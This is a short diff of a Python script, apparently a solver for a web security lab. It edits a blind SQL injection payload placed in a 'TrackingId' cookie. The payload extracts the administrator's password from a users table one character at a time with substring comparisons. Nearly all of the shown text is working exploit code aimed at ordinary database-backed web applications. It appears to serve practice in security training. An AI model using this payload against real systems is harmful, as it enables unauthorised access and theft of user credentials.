@@ -35,7 +35,7 @@ def makesqli():
 
 
 			cookies = {
-				'TrackingId': "uhOPvF9x33XD7PuM' and (select substring(password, %d, 1) from users where username='administrator')='%c'-- -" % (i, character),
+				'TrackingId': "' or (select substring(password, %d, 1) from users where username='administrator')='%c'-- -" % (i, character),
 				'session': '{Your session cookie}}'
 			}
 
